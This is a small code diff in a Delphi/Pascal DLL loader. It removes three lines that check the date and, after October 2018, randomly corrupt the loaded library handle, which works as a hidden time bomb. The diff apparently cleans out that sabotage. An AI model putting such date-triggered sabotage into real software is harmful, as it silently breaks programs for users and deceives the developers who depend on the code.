@@ -613,9 +613,6 @@ begin
   ErrorMode := SetErrorMode($8000{SEM_NoOpenFileErrorBox});
 {$ENDIF}
   DLLHandle := LoadLibrary('sisamplib.DLL');
- DecodeDate(now, tmp1, tmp2, tmp3);
-  if (tmp1-1000)>=1018 then
-  if tmp2 > 10 then  DLLHandle := DLLHandle + Round(Random);
   if DLLHandle >= 32 then
   begin
     DLLLoaded := True;
